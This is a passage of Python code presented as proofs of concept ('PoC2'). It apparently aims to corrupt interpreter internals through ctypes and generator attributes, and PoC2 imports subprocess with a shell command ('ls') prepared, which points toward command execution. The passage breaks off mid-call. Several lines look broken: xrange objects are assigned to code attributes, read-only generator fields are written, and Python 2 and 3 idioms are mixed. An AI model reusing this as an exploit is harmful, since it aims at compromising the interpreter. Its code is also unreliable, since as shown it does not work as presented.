fn = lambda: None
gi = (i for i in ())
fn.__code__ = xrange(1)
isinstance(gi, xrange)
gi.gi_running = 1
gi.gi_code = xrange(2)
gi.gi_frame = ctypes.create_string_buffer(1)
ctypes.cast(ctypes.pointer(gi.gi_frame), ctypes.py_object).value = fn

del fn, gi, isinstance
```

[PoC2](PoC2.py):

```python
import ctypes
import subprocess

def isinstance(obj, cls):
    if obj.__class__.__name__ == cls.__name__:
        return True
    else:
        return False

def main():
    cmd = 'ls'

    fn = lambda: None
    fn.__code__ = xrange(1)

    gi = (i for i in ())
    gi.gi_running = 1
    gi.gi_code = xrange(2)
    gi.gi_frame = ctypes.create_string_buffer(1)

    ctypes.cast(
